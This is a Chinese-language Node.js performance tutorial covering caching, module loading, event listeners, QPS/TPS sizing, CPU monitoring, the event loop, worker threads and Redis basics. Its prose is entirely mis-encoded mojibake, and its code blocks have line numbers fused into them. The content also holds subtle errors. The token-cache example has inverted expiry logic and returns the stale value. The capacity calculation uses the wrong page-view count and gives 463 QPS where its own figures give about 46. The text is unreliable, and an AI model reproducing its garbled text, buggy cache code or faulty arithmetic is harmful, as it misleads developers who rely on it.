é€šè¿‡å†…å­˜æ¥åšç¼“å­˜æ˜¯æœ€å¿«çš„å®žçŽ°æ–¹å¼ï¼Œç¼“å­˜ä¸­çš„å­˜å‚¨çš„é”®è¶Šå¤šï¼Œé•¿æœŸå­˜æ´»çš„å¯¹è±¡å°±è¶Šå¤šï¼Œåžƒåœ¾å›žæ”¶æ—¶å°†è¿™äº›å¯¹è±¡åšæ— ç”¨åŠŸã€‚ 12345678910111213141516// ä¸‹é¢ä¸€ä¸ªèŽ·å–ç”¨æˆ·Tokençš„ä¾‹å­ï¼ŒmemoryStoreå¯¹è±¡ä¼šéšç€ç”¨æˆ·æ•°çš„å¢žåŠ è€Œå¢žé•¿ï¼Œå½“å¯åŠ¨å¤šä¸ªçº¿ç¨‹æˆ–è€…éƒ¨ç½²åœ¨å¤šå°æœºå™¨ä¼šé€ æˆæ¯ä¸ªè¿›ç¨‹éƒ½ä¿å­˜ä¸€ä»½ï¼Œæ˜¾ç„¶æ˜¯èµ„æºçš„æµªè´¹ï¼Œæœ€å¥½æ˜¯é€šè¿‡Redisåšå…±äº«const memoryStore = new Map();exports.getUserToken = function(key)&#123; const token = memoryStore.get(key); if(token &amp;&amp; Date.now() - token.now &gt; 2 * 60)&#123; return token; &#125; const dbToken = db.get(key); memoryStore.set(key,&#123; now:Date.now(), val:dbToken &#125;); return token;&#125; æ¨¡å—ç§æœ‰å˜é‡å†…å­˜å¸¸é©» åŠ è½½ä¸€ä¸ªæ¨¡å—ä»£ç ä¹‹å‰ï¼ŒNodejsä¼šä½¿ç”¨ä¸€ä¸ªå¦‚ä¸‹çš„å‡½æ•°å°è£…å™¨å°†å…¶å°è£…ï¼Œä¿è¯äº†é¡¶å±‚çš„å˜é‡ï¼ˆvar,const,letï¼‰åœ¨æ¨¡å—èŒƒå›´å†…ï¼Œè€Œä¸æ˜¯å…¨å±€å¯¹è±¡ã€‚è¿™ä¸ªæ—¶å€™å°±ä¼šå½¢æˆä¸€ä¸ªé—­åŒ…ï¼Œåœ¨requireæ—¶ä¼šè¢«åŠ è½½ä¸€æ¬¡ï¼Œå°†exportså¯¹è±¡ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç›´åˆ°è¿›ç¨‹é€€å‡ºæ‰ä¼šå›žæ”¶ï¼Œè¿™ä¸ªå°†ä¼šå¯¼è‡´çš„æ˜¯å†…å­˜å¸¸é©»ï¼Œæ‰€ä»¥é¿å…ä¸€äº›æ²¡å¿…è¦çš„æ¨¡å—åŠ è½½ï¼Œå¦åˆ™ä¹Ÿä¼šé€ æˆå†…å­˜å¢žåŠ  1234567891011121314(function(exports,require,module,__filename,__dirname)&#123; // æ¨¡å—çš„ä»£ç å®žé™…ä¸Šåœ¨è¿™é‡Œ&#125;)// æ‰€ä»¥å»ºè®®å¯¹æ¨¡å—çš„å¼•ç”¨ä»…åœ¨å¤´éƒ¨åˆæ¬¡åŠ è½½ä¹‹åŽç”¨constç¼“å­˜èµ·æ¥ï¼Œè€Œä¸æ˜¯åœ¨ä½¿ç”¨æ—¶æ¯æ¬¡éƒ½åŽ»åŠ è½½ä¸€èµ·ã€‚// æŽ¨èconst a = require('a.js');function test()&#123; a.run();&#125;// ä¸æŽ¨èfunction test()&#123; require('a.js').run();&#125; äº‹ä»¶åå¤ç›‘å¬ NodeJsä¸­å¯¹ä¸€ä¸ªäº‹ä»¶åå¤ç›‘å¬åˆ™ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯ï¼Œå®žé™…ä¸Šä½¿ç”¨çš„EventEmitterç±»ï¼ŒåŒ…å«ä¸€ä¸ªlistenersæ•°ç»„ï¼Œé»˜è®¤ä¸º10ä¸ªç›‘å¬å™¨è¶…å‡ºè¿™ä¸ªæ•°åˆ™ä¼šæŠ¥è­¦ï¼Œç”¨äºŽå‘çŽ°å†…å­˜æ³„éœ²ï¼Œä¹Ÿå¯ä»¥é€šè¿‡emitter.setMaxListeners()æ–¹æ³•ä¸ºæŒ‡å®šçš„EventEmitterå®žä¾‹ä¿®æ”¹é™åˆ¶ 1MaxListenersExceededWarningï¼šPossible EventEmitter memory leak detected, 11 connect added.Use emitter.setMaxListeners() to increase limit å…¶ä»–æ³¨æ„äº‹é¡¹ ä½¿ç”¨å®šæ—¶å™¨setIntervalæ—¶è®°å¾—ä½¿ç”¨å¯¹åº”çš„clearIntervalè¿›è¡Œæ¸…é™¤ã€‚å› ä¸ºsetIntervalæ‰§è¡Œå®Œä¹‹åŽä¼šè¿”å›žä¸€ä¸ªå€¼ä¸”ä¸ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå¦å¤–è¿˜æœ‰map/filterç­‰å¯¹æ•°ç»„è¿›è¡Œæ“ä½œï¼Œæ¯æ¬¡æ“ä½œä¹‹åŽéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œå°†ä¼šå ç”¨å†…å­˜ï¼Œå¦‚æžœå•çº¯çš„éåŽ†mapå¯ä»¥ç”¨forEachã€‚ æ’ä»¶ç¼“å­˜ [Cache] memory-fs å°†æ–‡ä»¶å†™å…¥å†…å­˜ [Cache] Memory Cache [Cache] Node Cache å®šæ—¶ä»»åŠ¡ [Schedule] node-schedule [Schedule] Agenda å°†Nodeä¸­çš„å®šæ—¶ä»»åŠ¡å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼ˆå®˜æ–¹æŽ¨èMongoDBï¼‰ [Schedule] Node.jsç»“åˆRabbitMQå»¶è¿Ÿé˜Ÿåˆ—å®žçŽ°å®šæ—¶ä»»åŠ¡ æ¨¡æ¿å¼•æ“Ž [Template] Ejs [Template] Handlebarsjs [Template] Jade æ¡†æž¶ [Framework] Express ä¸­æ–‡ç‰ˆã€Express of English Version [Framework] Koa ä¸­æ–‡ç‰ˆã€Koa of English Version [Framework] Egg ä¸­æ–‡ç‰ˆã€Egg of English Version [Framework] Nest.js ä¸­æ–‡ç‰ˆã€Nest.js ORM [typeorm] typeorm ã€å³ä¸Šè§’åˆ‡æ¢ä¸­æ–‡ã€‘ [sequelize] sequelize [prisma] prisma æ€§èƒ½æŒ‡æ ‡QPS QPSï¼ˆQuery Per Secondï¼‰æŒ‡æ¯ç§’æŸ¥è¯¢é‡ï¼Œè§„å®šæ—¶é—´å†…æ‰€èƒ½å¤„ç†çš„æµé‡å¤§å°ï¼Œé€šå¸¸QPSå€¼è¶Šå¤§æœåŠ¡å™¨çš„åžåé‡ä¹Ÿå°±è¶Šå¤§ï¼Œç›¸å¯¹æœåŠ¡å™¨è´Ÿè·ä¹Ÿä¼šè¶Šé«˜ QPS=å¹¶å‘é‡/å¹³å‡å“åº”æ—¶é—´å¹¶å‘é‡ = QPS * å¹³å‡å“åº”æ—¶é—´ TPS TPSï¼ˆTransactionPerSecondï¼‰æŒ‡æ¯ç§’äº‹ç‰©å¤„ç†é‡ï¼Œæ¯ç§’é’Ÿç³»ç»Ÿæ‰€èƒ½å¤„ç†çš„äº¤æ˜“æˆ–äº‹åŠ¡çš„æ•°é‡ï¼Œç”¨æ¥å½¢å®¹ç³»ç»Ÿçš„æ€§èƒ½ã€‚ ä¸¤è€…åŒºåˆ« ä¸€æ¬¡ä¸‹å•è¯·æ±‚ï¼Œè®¿é—®ä¸€æ¬¡åˆ›å»ºæŽ¥å£äº§ç”Ÿä¸€æ¬¡TPS,å¯¹äºŽæœåŠ¡å™¨çš„è¯·æ±‚å¯èƒ½ä¼šäº§ç”Ÿå¤šæ¬¡ï¼Œæ¯”å¦‚æŸ¥è¯¢ç”¨æˆ·åœ°å€ä¿¡æ¯ã€å•†å“æ•°æ®ä¿¡æ¯ã€å•†å“æŠ¥ä»·ä¿¡æ¯ï¼Œè¿™äº›è¯·æ±‚è®¡å…¥QPS,ä¹Ÿå°±æ˜¯äº§ç”Ÿäº†3æ¬¡QPS ç³»ç»Ÿæ‰©å®¹è¯„ä»·æ ¹æ®äºŒå…«æ³•åˆ™æ¥è¯„ä¼°ç³»ç»Ÿæ‰©å®¹éœ€è¦å¤šå°‘å°æœºå™¨ï¼ŒäºŒå…«æ³•åˆ™å³20%çš„æ—¶é—´æ‰¿è½½80%çš„æµé‡ï¼ŒæŠŠ20%çš„æ—¶é—´ç§°ä¸ºå³°å€¼æ—¶é—´ï¼Œæ¢ç®—å…¬å¼ï¼š 12(æ€»PVæ•° * 80%) / (æ¯å¤©æè¿° * 20%) = å³°å€¼æ—¶é—´æ¯ç§’è¯·æ±‚æ•°å³°å€¼æ—¶é—´å†…æ¯ç§’è¯·æ±‚æ•°ï¼ˆQPSï¼‰/å•å°æœºå™¨QPS = éœ€è¦çš„æœºå™¨ å‡è®¾æœ‰1000wPV,æ€»å…±éœ€è¦çš„QPSä¸ºå¤šå°‘ï¼Ÿ 1(1000000 * 0.8) / (24 * 60 * 60 * 0.2) = 463(QPS) å‡è®¾æ¯å°æœºå™¨æ”¯æ’‘100QPSï¼Œåˆ™å…±éœ€è¦çš„æœºå™¨ä¸º 1463(æ€»æœ‰QPS)/100(å•æœºQPS) = 5(çº¦éœ€è¦5å°æœºå™¨) Nodejs CPUä½¿ç”¨çŽ‡os.cups()æ•°æ®æŒ‡æ ‡è¿”å›žçš„å¯¹è±¡æ•°ç»„ä¸­æœ‰ä¸€ä¸ªtimeså­—æ®µï¼ŒåŒ…å«äº†user/nice/sys/idle/irqå‡ ä¸ªæŒ‡æ ‡æ•°æ®ï¼Œåˆ†åˆ«ä»£è¡¨CPUåœ¨ç”¨æˆ·æ¨¡å¼ã€è‰¯å¥½æ¨¡å¼ã€ç³»ç»Ÿæ¨¡å¼ã€ç©ºé—²æ¨¡å¼ã€ä¸­æ–­æ¨¡å¼ä¸‹è¯è´¹çš„æ¯«ç§’æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546[ &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 151474100, nice: 0, sys: 95311197, idle: 2258535287, irq: 2136605 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 84900939, nice: 0, sys: 65104926, idle: 2355314423, irq: 874869 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 144337320, nice: 0, sys: 112618416, idle: 2248364428, irq: 699602 &#125; &#125;, &#123; model: 'Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz', speed: 3292, times: &#123; user: 110066333, nice: 0, sys: 84988268, idle: 2310265437, irq: 897333 &#125; &#125;] å®šä¹‰æ–¹æ³•getCPUInfoç”¨æ¥èŽ·å–ç³»ç»ŸCPUä¿¡æ¯ï¼Œæä¾›äº†CPUåˆ©ç”¨çŽ‡çš„å®žæ—¶ç›‘æŽ§ï¼Œè¿™ä¸ªå®žæ—¶ä¸æ˜¯ç»å¯¹çš„å®žæ—¶ï¼Œä¼šæœ‰æ—¶å·®ï¼Œä¸‹é¢å®žçŽ°ä¸­é»˜è®¤è®¾ç½®çš„1ç§’é’Ÿï¼Œå¯ä»¥é€šè¿‡Options.msè¿›è¡Œè°ƒæ•´ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const os = require('os');const sleep = ms =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms));class OSUtils &#123; constructor() &#123; this.cpuUsageMSDefault = 1000; // CPU åˆ©ç”¨çŽ‡é»˜è®¤æ—¶é—´æ®µ &#125; /** * èŽ·å–CPUä¿¡æ¯ * @return &#123;Object&#125; CPUä¿¡æ¯ */ _getCPUInfo() &#123; const cpus = os.cpus(); let user = 0, nice = 0, sys = 0, idle = 0, irq = 0, total = 0; for (let cpu in cpus) &#123; const times = cpus[cpu].times; user += times.user; nice += times.nice; sys += times.sys; idle += times.idle; irq += times.irq; &#125; total += user + nice + sys + idle + irq; return &#123; user, sys, idle, total &#125;&#125; /** * èŽ·å–æŸæ—¶é—´æ®µCPUåˆ©ç”¨çŽ‡ * @param &#123;Number&#125; Options.ms [æ—¶é—´æ®µï¼Œé»˜è®¤æ˜¯1000msï¼Œå³1ç§’é’Ÿ] * @param &#123;Boolean&#125; Options.percentage [trueï¼ˆä»¥ç™¾åˆ†æ¯”ç»“æžœè¿”å›žï¼‰| false] * @return &#123;Promise&#125; */ async getCPUUsage(options = &#123;&#125;) &#123; const that = this; let &#123; cpuUsageMS, percentage &#125; = options; cpuUsageMS = cpuUsageMS || that.cpuUsageMSDefault; const t1 = that._getCPUInfo(); // t1æ—¶é—´ç‚¹çš„ CPUä¿¡æ¯ await sleep(cpuUsageMS); const t2 = that._getCPUInfo(); // t2æ—¶é—´ç‚¹çš„ CPUä¿¡æ¯ const idle = t2.idle - t1.idle; const total = t2.total - t1.total; let usage = 1 - idle / total; if (percentage) usage = (usage * 100.0).toFixed(2) + '%'; return usage; &#125;&#125; ä½¿ç”¨æ–¹å¼ï¼š 12345const osUtils = new OSUtils()osUtils.getCPUUsage(&#123; percentage: true &#125;).then(cpuUsage =&gt; &#123; console.log('CPU åˆ©ç”¨çŽ‡', cpuUsage)&#125;); NodeJsä¸ŽEvent Loopnodeä¹‹å‰çš„ä¸–ç•Œï¼Œå¤šçº¿ç¨‹æœåŠ¡å™¨ä¸­ï¼ŒWebåº”ç”¨ç¨‹åºæ˜¯ç”¨ä¸€ä¸ªclient/server(å®¢æˆ·ç«¯/æœåŠ¡ç«¯)æ¨¡å¼æ‰€ç¼–å†™çš„ï¼Œå…¶ä¸­clientå°†å‘serverè¯·æ±‚èµ„æºå¹¶ä¸”å°†ä¼šæ ¹æ®è¿™ä¸ªèµ„æºä»¥å“åº”ï¼Œserverä»…åœ¨clientè¯·æ±‚æ—¶åšå‡ºå“åº”ï¼Œå¹¶åœ¨æ¯æ¬¡å“åº”åŽå…³é—­è¿žæŽ¥ã€‚è¿™ç§æ¨¡å¼æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå¯¹æœåŠ¡å™¨çš„æ¯ä¸€ä¸ªè¯·æ±‚éƒ½éœ€è¦æ—¶é—´å’Œèµ„æºï¼ˆå†…å­˜ã€CPUç­‰ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨å¿…é¡»å®Œæˆä¸Šä¸€ä¸ªè¯·æ±‚ï¼Œæ‰èƒ½æŽ¥å—ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚éœ€è¦åŒæ—¶å¤„ç†Nä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨å°±éœ€è¦Nä¸ªçº¿ç¨‹ï¼Œå¦‚æžœæœ‰N+1ä¸ªè¯·æ±‚ï¼Œå°±å¿…é¡»ç­‰Nä¸ªçº¿ç¨‹ä¸­çš„ä»»ä½•ä¸€ä¸ªå¯ç”¨ã€‚ æœåŠ¡å™¨ä¸­çš„çº¿ç¨‹ä¸æ˜¯å”¯ä¸€çš„é—®é¢˜ï¼Œä¸€ä¸ªçº¿ç¨‹ä¸ºä»€ä¹ˆä¸èƒ½åŒæ—¶å¤„ç†2ä¸ªæˆ–è€…æ›´å¤šè¯·æ±‚ï¼Œæ˜¯å› ä¸ºé˜»å¡žäº†Input/Outputæ“ä½œã€‚ æ“ä½œ CPUæ—¶é’Ÿå‘¨æœŸæ•°(ticks) CPUå¯„å­˜å™¨ 3 L1 Cache(ä¸€çº§ç¼“å­˜) 8 L2 Cache(äºŒçº§ç¼“å­˜) 12 RAM(éšæœºå­˜å–å­˜å‚¨å™¨) 150 Diskï¼ˆç£ç›˜ï¼‰ 30 000 000 NetWorkï¼ˆç½‘ç»œï¼‰ 250 000 000 æ—¶é’Ÿå‘¨æœŸä¹Ÿç§°ä¸ºtick/clock cycle/clock periodç­‰ï¼ŒæŒ‡ä¸€ä¸ªç¡¬ä»¶åœ¨è¢«ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œè¢«åˆ’åˆ†ä¸ºå¤šä¸ªæ—¶é—´å‘¨æœŸï¼Œå½“æˆ‘ä»¬éœ€è¦æ¯”è¾ƒä¸åŒç¡¬ä»¶æ€§èƒ½æ—¶ï¼Œå°±åœ¨ä¸åŒç¡¬ä»¶ä¸Šæµ‹è¯•åŒä¸€ä¸ªè½¯ä»¶ï¼Œè§‚å¯Ÿå®ƒä»¬çš„æ—¶é’Ÿå‘¨æœŸæ—¶é—´å’Œå‘¨æœŸæŒ‡æ•°ï¼Œå¦‚æžœæ—¶é’Ÿå‘¨æœŸè¶Šé•¿ã€å‘¨æœŸè¶Šå¤šï¼Œå°±æ„å‘³ç€è¿™ä¸ªç¡¬ä»¶éœ€è¦çš„æ€§èƒ½è¾ƒä½Žã€‚ Event Loopäº‹ä»¶å¾ªçŽ¯äº‹ä»¶å¾ªçŽ¯å®žé™…ä¸Šæ˜¯ä¸€ä¸ªæ— é™å¾ªçŽ¯ï¼Œå¹¶ä¸”çº¿ç¨‹é‡Œå”¯ä¸€å¯ç”¨çš„ã€‚ 1234567891011121314151617181920static void StartNodeInstance(void* arg)&#123; // ... &#123; SealHandleScope seal(isolate); bool more; do&#123; v8::platform::PumpMessageLoop(default_platform,isolate); more = uv_run(env-&gt;event_loop(),UV_RUN_ONCE); if(mode == false)&#123; v8::platform::PumpMessageLoop(default_platform,isolate); EmitBeforeExit(env); more = uv_loop_alive(env-&gt;event_loop()); if(uv_run(env-&gt;event_loop),UV_RUN_NOWAIT)!=0)&#123; more = true &#125; &#125; &#125;while(more == true) &#125;&#125; äº‹ä»¶å¾ªçŽ¯ç»åŽ†6ä¸ªé˜¶æ®µï¼Œæ‰€æœ‰é˜¶æ®µçš„æ‰§è¡Œè¢«ç§°ä¸ºtick 1timers-&gt;pending callbacks -&gt;idle,prepare-&gt;poll-&gt;check-&gt;close callbacks timersï¼šè¿™ä¸ªé˜¶æ®µæ‰§è¡Œå®šæ—¶å™¨setTimeoutå’ŒsetIntervalçš„å›žè°ƒå‡½æ•° pending callbacksï¼šå‡ ä¹Žæ‰€æœ‰çš„å›žè°ƒéƒ½åœ¨è¿™é‡Œæ‰§è¡Œï¼Œé™¤äº†closeå›žè°ƒï¼Œå®šæ—¶å™¨timersé˜¶æ®µçš„å›žè°ƒå’ŒsetImmediate idle,prepareï¼šä»…åœ¨å†…éƒ¨ä½¿ç”¨ pollï¼šæ£€ç´¢æ–°çš„I/Oäº‹ä»¶ï¼Œé€‚å½“æ—¶Nodeåœ¨æ­¤å¤„é˜»å¡ž checkï¼šsetImmediateå›žè°ƒå‡½æ•°å°†åœ¨è¿™é‡Œæ‰§è¡Œ close callbacksï¼šä¸€äº›å‡†å¤‡å…³é—­çš„å›žè°ƒå‡½æ•°ï¼Œå¦‚ socket.on(â€˜closeâ€™,â€¦) å½“Event loopéœ€è¦æ‰§è¡ŒI/Oæ“ä½œæ—¶ï¼Œå®ƒå°†ä»Žä¸€ä¸ªæ± ï¼ˆé€šè¿‡Libuvåº“ï¼‰ä¸­ä½¿ç”¨ç³»ç»Ÿçº¿ç¨‹ï¼Œå½“è¿™ä¸ªä½œä¸šå®Œæˆæ—¶ï¼Œå›žè°ƒå°†æŽ’é˜Ÿç­‰å¾…åœ¨pending callbacksé˜¶æ®µè¢«æ‰§è¡Œ CPUå¯†é›†åž‹ä»»åŠ¡é—®é¢˜è®¾å®šä¸€ä¸ªå‡½æ•°ï¼Œç»™å®šä¸€ä¸ªæ•°ï¼Œè®¡ç®—åœ¨ä¸€ä¸ªæ•°ç»„ä¸­è¿”å›žNä¸ªè´¨æ•° 12345678910111213141516171819202122232425262728293031323334353637383940// primes.jsfunction isPrime(n) &#123; for (let i = 2, s = Math.sqrt(n); i &lt;= s; i++) if (n % i === 0) return false; return n &gt; 1;&#125;function nthPrime(n) &#123; let counter = n; let iterator = 2; let result = []; while (counter &gt; 0) &#123; isPrime(iterator) &amp;&amp; result.push(iterator) &amp;&amp; counter--; iterator++; &#125; return result;&#125;module.exports = &#123; isPrime, nthPrime &#125;;const http = require('http');const url = require('url');const primes = require('./primes');// index.jshttp.createServer((req, res) =&gt; &#123; const &#123; pathname, query &#125; = url.parse(req.url, true); if (pathname === '/primes') &#123; const result = primes.nthPrime(query.n || 0); res.setHeader('Content-Type', 'application/json'); res.write(JSON.stringify(result)); res.end() &#125; else &#123; res.statusCode = 404; res.write('Not Found'); res.end(); &#125;&#125;).listen(9898);// index.js åˆ›å»ºä¸€ä¸ªæœåŠ¡å¹¶åœ¨æ¯æ¬¡è¯·æ±‚ /primesè¿™ä¸ªåº“ï¼Œé€šè¿‡queryä¼ é€’å‚æ•°ï¼Œå‡è®¾æœ‰3ä¸ªå®¢æˆ·ç«¯è®¿é—®è¿™ä¸ªéžé˜»å¡žAPI,ç¬¬ä¸€ä¸ªé¡µé¢è¯·æ±‚5ä¸ªè´¨æ•°ï¼Œç¬¬äºŒä¸ª1000ä¸ªï¼Œç¬¬ä¸‰ä¸ª100000000ä¸ªï¼Œä¼šå‘çŽ°ï¼Œç¬¬ä¸‰ä¸ªè¯·æ±‚æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šè¢«é˜»å¡žï¼Œå› ä¸ºè´¨æ•°ä¼šå ç”¨å¤§é‡çš„CPU,ä¸»çº¿ç¨‹å¿™äºŽæ‰§è¡Œå¯†é›†åž‹çš„ä»£ç ï¼Œå°†æ— æ³•åšå…¶ä»–äº‹æƒ…ï¼Œè¿˜æœ‰Nodeå¼•å…¥äº†å·¥ä½œçº¿ç¨‹ å·¥ä½œçº¿ç¨‹å·¥ä½œçº¿ç¨‹å¯¹äºŽæ‰§è¡ŒCPUå¯†é›†åž‹çš„javascriptæ“ä½œéžå¸¸æœ‰ç”¨ï¼Œåœ¨I/Oå¯†é›†åž‹çš„å·¥ä½œä¸­ç”¨é€”ä¸å¤§ï¼ŒNodeJså†…ç½®çš„å¼‚æ­¥I/Oæ“ä½œæ¯”å·¥ä½œçº¿ç¨‹æ•ˆçŽ‡æ›´é«˜ ä¿®æ”¹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const &#123; workerData, parentPort &#125; = require('worker_threads');function isPrime(n) &#123; for (let i = 2, s = Math.sqrt(n); i &lt;= s; i++) if (n % i === 0) return false; return n &gt; 1;&#125;function nthPrime(n) &#123; let counter = n; let iterator = 2; let result = []; while (counter &gt; 0) &#123; isPrime(iterator) &amp;&amp; result.push(iterator) &amp;&amp; counter--; iterator++; &#125; return result;&#125;parentPort.postMessage(nthPrime(workerData.n))// index.jsconst http = require('http');const url = require('url');const &#123; Worker &#125; = require('worker_threads')http.createServer((req, res) =&gt; &#123; const &#123; pathname, query &#125; = url.parse(req.url, true); if (pathname === '/primes') &#123; const worker = new Worker('./primes.js', &#123; workerData: &#123; n: query.n || 0 &#125; &#125;) worker.on('error', () =&gt; &#123; res.statusCode = 500; res.write('Oops there was an error'); res.end(); &#125;) let result; worker.on('message', (message) =&gt; &#123; result = message; &#125;) worker.on('exit', () =&gt; &#123; res.setHeader('Content-Type', 'application/json'); res.write(JSON.stringify(result)); res.end() &#125;) &#125; else &#123; res.statusCode = 404; res.write('Not Found'); res.end(); &#125;&#125;).listen(9898);// index.jsåœ¨æ¯ä¸ªè¯·æ±‚ä¸­åˆ›å»ºä¸€ä¸ªWorkerå®žä¾‹ï¼Œåœ¨ä¸€ä¸ªå·¥ä½œçº¿ç¨‹ä¸­åŠ è½½å¹¶æ‰§è¡Œprimesæ–‡ä»¶ï¼Œå½“è¿™ä¸ªè´¨æ•°åˆ—è¡¨è®¡ç®—å®Œæˆä¹°è¿™ä¸ªmessageå°†ä¼šè¢«è§¦å‘ï¼ŒæŽ¥å—ä¿¡æ¯å¹¶èµ‹å€¼resultï¼Œç”±äºŽè¿™ä¸ªjobå·²å®Œæˆï¼Œå°†ä¼šå†æ¬¡è§¦å‘exitäº‹ä»¶ï¼Œå…è®¸ä¸»çº¿ç¨‹å‘é€æ•°æ®åˆ°å®¢æˆ·ç«¯// primeså¯¼å…¥ workerData(ä»Žä¸»çº¿ç¨‹ä¼ é€’å‚æ•°)ï¼ŒparentPortæ˜¯å‘ä¸»çº¿ç¨‹å‘é€æ¶ˆæ¯çš„æ–¹å¼// ä¸»çº¿ç¨‹å°†ä¸ä¼šå†é˜»å¡žï¼Œä½†æ˜¯ç”Ÿæˆå·¥ä½œçº¿ç¨‹å¹¶ä¸æ˜¯æœ€ä½³å®žè·µï¼Œåˆ›å»ºæ–°çº¿ç¨‹å¹¶ä¸ä¾¿å®œï¼Œä¸€å®šè¦å…ˆåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ±  RedisRedisæ˜¯ä¸€ä¸ªå…è´¹å¼€æºã€åŸºäºŽå†…å­˜çš„é«˜æ€§èƒ½Key-Valueæ•°æ®åº“ï¼Œå…·æœ‰é€Ÿåº¦å¿«ï¼Œæ•°æ®æŒä¹…åŒ–ï¼Œå¤šè¯­è¨€å’Œå¤šåŠŸèƒ½ç­‰ç‰¹æ€§ã€‚ é€Ÿåº¦å¿«ï¼š10w OPSèƒ½åŠ›ï¼Œå•çº¿ç¨‹æ¨¡åž‹ï¼Œæ•°æ®å­˜äºŽå†…å­˜ä¸­ï¼Œæ³¨æ„ä¸€æ¬¡åªèƒ½è¿è¡Œä¸€æ¬¡å‘½ä»¤ï¼Œä½¿ç”¨è¿‡ç¨‹æ‹’ç»ä½¿ç”¨æ…¢å‘½ä»¤ï¼Œä¾‹å¦‚keys/flushall/flushdb/slow lua script/mutil/execç­‰ æŒä¹…åŒ–ï¼šåŸºäºŽå†…å­˜æ¨¡åž‹ï¼Œæ–­ç”µåŽæˆ–è€…æœåŠ¡é‡å¯ä¼šé€ æˆæ•°æ®ä¸¢å¤±ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œæå‡ºä¸¤ç§æ•°æ®æŒä¹…åŒ–ç­–ç•¥ï¼Œåˆ†åˆ«ä¸ºRDBå’ŒAOF,ä¼šå°†Redisåœ¨å†…å­˜ä¸­çš„æ•°æ®å¼‚æ­¥æ›´æ–°åˆ°ç£ç›˜ä¸­ï¼Œå®žçŽ°æ•°æ®çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚ ä¸°å¯Œçš„æ•°æ®ç±»åž‹ï¼šé™¤äº†å¸¸è§çš„String/HashTable/List/Set/Zsetä¹‹å¤–è¿˜æœ‰BitMaps(ä½å›¾)ã€HyperLogLogï¼ˆè¶…å°å†…å­˜å”¯ä¸€è®¡æ•°ï¼‰ å¤šè¯­è¨€ï¼šåŸºäºŽTCPçš„é€šä¿¡æ–¹å¼ï¼Œæ”¯æŒNode.Js/Python/Java/Ruby/Luaç­‰ã€‚ å¤šåŠŸèƒ½ï¼šæä¾›äº†å‘å¸ƒè®¢é˜…ã€ç®€å•çš„äº‹åŠ¡åŠŸèƒ½ã€pipelineæé«˜å®¢æˆ·ç«¯å¹¶å‘æ•ˆçŽ‡ã€‚å¦å¤–åœ¨Redisä¸­æ‰€æœ‰å•ä¸ªå‘½ä»¤æ“ä½œéƒ½æ˜¯åŽŸå­æ€§çš„ï¼Œå¦‚æžœæƒ³å¯¹å¤šä¸ªå‘½ä»¤ä¸€èµ·æ“ä½œï¼Œå¯ä»¥å€ŸåŠ©Luaè„šæœ¬ï¼ˆå®žçŽ°è‡ªå®šä¹‰å‘½ä»¤ï¼Œä¿è¯åŽŸå­æ€§ï¼‰ é€šç”¨å‘½ä»¤ keys * ï¼šéåŽ†æ‰€æœ‰keyï¼Œç”Ÿäº§çŽ¯å¢ƒä¸å»ºè®®ä½¿ç”¨ï¼Œæ—¶é—´å¤æ‚åº¦O(n) dbsize keyï¼šè®¡ç®—keyçš„æ€»æ•°ï¼ŒRediså†…ç½®äº†è¿™ä¸ªè®¡æ•°å™¨ï¼Œä¼šå®žæ—¶æ›´æ–°keyçš„æ€»æ•°ï¼Œæ—¶é—´å¤æ‚åº¦O(1) exists keyï¼šæ£€æŸ¥keyæ˜¯å¦å­˜åœ¨ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1) expire key secondsï¼škeyåœ¨æŒ‡å®šsecondåŽè¿‡æœŸï¼Œæ—¶é—´å¤æ‚åº¦O(1) ttl keyï¼škeyå‰©ä½™çš„è¿‡æœŸæ—¶é—´ï¼Œæ—¶é—´å¤æ‚åº¦O(1) persist key: åŽ»æŽ‰keyçš„è¿‡æœŸæ—¶é—´ï¼Œæ—¶é—´å¤æ‚åº¦O(1) type keyï¼šæŸ¥çœ‹keyçš„ç±»åž‹ï¼Œæ—¶é—´å¤æ‚åº¦O(1) æ•°æ®ç»“æž„å­—ç¬¦ä¸²æœ€å¤§é™åˆ¶512MB,é€‚ç”¨äºŽç¼“å­˜ã€è®¡ç®—å™¨ã€åˆ†å¸ƒå¼é”ç­‰ï¼Œå­—ç¬¦ä¸²ç±»åž‹çš„å€¼å¯ä»¥ä¸ºç®€å•çš„å­—ç¬¦ä¸²ã€JSONã€XMLã€æ•°ç»„ç”šè‡³æ˜¯äºŒè¿›åˆ¶ï¼ˆè§†é¢‘ï¼‰ å¸¸è§å‘½ä»¤ å‘½ä»¤ å«ä¹‰ æ—¶é—´å¤æ‚åº¦ set get del å¯¹keyè¿›è¡Œè®¾ç½®ã€è¯»å–ã€åˆ é™¤ O(1) incr decr è®¡æ•° O(1) incrby decrby å¯¹è®¡æ•°è®¾ç½®å¢žé‡ O(1) setnx keyå­˜åœ¨ä¸åšä»»ä½•æ“ä½œ O(1) setex keyå­˜åœ¨åšæ“ä½œä¸Žsetnxç›¸å O(1) getset è®¾ç½®æ–°å€¼è¿”å›žæ—§å€¼ getset key newValue O(1) mset mget å¤šä¸ªkeyè¿›è¡Œè®¾ç½®ã€è¯»å– O(1) set 12345set key value 